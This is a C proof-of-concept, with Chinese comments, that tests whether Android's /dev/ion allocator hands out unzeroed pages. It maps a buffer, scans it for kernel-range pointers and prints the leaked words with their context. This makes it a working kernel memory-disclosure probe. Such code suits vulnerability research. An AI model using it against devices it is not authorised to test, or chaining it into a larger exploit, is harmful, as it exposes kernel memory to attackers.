/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * ionleak —— 验证 /dev/ion 分配的 buffer 是否清零
 *
 * ion 在未指定 ION_FLAG_CACHED/zero 时会复用 buddy 空闲页，
 * 若不清零，mmap 后能读到该物理页的前任内容。
 * 内核栈是 order-1 (8KB) 页，释放后回到 buddy，理论上可能被 ion 拿到。
 *
 * 判据：扫描映射区，统计落在 [0xc0000000,0xe7800000) 的 32 位值。
 * 若命中，打印附近 32 字节供判断是否像内核栈/结构体。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define ION_IOC_MAGIC 'I'

struct ion_allocation_data {
	size_t len;
	size_t align;
	unsigned int heap_mask;
	unsigned int flags;
	void *handle;
};

struct ion_fd_data {
	void *handle;
	int fd;
};

struct ion_handle_data {
	void *handle;
};

#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE  _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

static int is_kaddr(uint32_t v)
{
	return v >= 0xc0000000u && v < 0xe7800000u;
}

int main(int argc, char **argv)
{
	int fd, i;
	size_t len = (argc > 1) ? (size_t)strtoul(argv[1], NULL, 0) : (4u << 20);
	unsigned int mask = (argc > 2) ? (unsigned int)strtoul(argv[2], NULL, 0) : 0xffffffffu;
	struct ion_allocation_data ad;
	struct ion_fd_data fdd;
	unsigned char *p;
	int hits = 0, samples = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	fd = open("/dev/ion", O_RDWR);
	if (fd < 0) { printf("[!] open /dev/ion errno=%d (%s)\n", errno, strerror(errno)); return 1; }
	printf("ion fd=%d  request len=%zu mask=%#x\n", fd, len, mask);

	memset(&ad, 0, sizeof ad);
	ad.len = len;
	ad.align = 0x1000;
	ad.heap_mask = mask;
	ad.flags = 0;
	errno = 0;
	if (ioctl(fd, ION_IOC_ALLOC, &ad) < 0) {
		printf("[!] ION_IOC_ALLOC errno=%d (%s)\n", errno, strerror(errno));
		/* 退化：试单一 heap 位 */
		for (i = 0; i < 20; i++) {
			memset(&ad, 0, sizeof ad);
			ad.len = len; ad.align = 0x1000;
			ad.heap_mask = (1u << i); ad.flags = 0;
			errno = 0;
			if (ioctl(fd, ION_IOC_ALLOC, &ad) == 0) {
				printf("    heap bit %d ok, handle=%p\n", i, ad.handle);
				break;
			}
		}
		if (i == 20) { printf("    no heap usable\n"); return 1; }
	}
	printf("alloc ok, handle=%p\n", ad.handle);

	memset(&fdd, 0, sizeof fdd);
	fdd.handle = ad.handle;
	if (ioctl(fd, ION_IOC_SHARE, &fdd) < 0) {
		printf("[!] ION_IOC_SHARE errno=%d (%s)\n", errno, strerror(errno));
		return 1;
	}
	printf("share fd=%d\n", fdd.fd);

	p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fdd.fd, 0);
	if (p == MAP_FAILED) {
		printf("[!] mmap errno=%d (%s)\n", errno, strerror(errno));
		return 1;
	}
	printf("mapped %p, scanning %zu bytes...\n", p, len);

	{
		size_t off;
		for (off = 0; off + 4 <= len; off += 4) {
			uint32_t v;
			memcpy(&v, p + off, 4);
			if (!is_kaddr(v)) continue;
			hits++;
			if (samples < 12) {
				size_t j, s = off > 16 ? off - 16 : 0, e = off + 32;
				printf("  HIT @0x%06zx val=%08x base8k=%08x\n   ctx:",
				       off, v, v & ~0x1fffu);
				for (j = s; j + 4 <= e && j + 4 <= len; j += 4) {
					uint32_t w;
					memcpy(&w, p + j, 4);
					printf(" %s%08x%s", j == off ? "[" : "", w,
					       j == off ? "]" : "");
				}
				printf("\n");
				samples++;
			}
		}
	}

	{
		size_t z = 0, off;
		for (off = 0; off < len; off += 4) {
			uint32_t v;
			memcpy(&v, p + off, 4);
			if (v == 0) z++;
		}
		printf("\nzero words: %zu / %zu (%.1f%%)\n", z, len / 4,
		       100.0 * (double)z / (double)(len / 4));
	}
	printf("kernel-range hits: %d\n", hits);

	munmap(p, len);
	close(fdd.fd);
	{
		struct ion_handle_data hd = { ad.handle };
		ioctl(fd, ION_IOC_FREE, &hd);
	}
	close(fd);
	return 0;
}
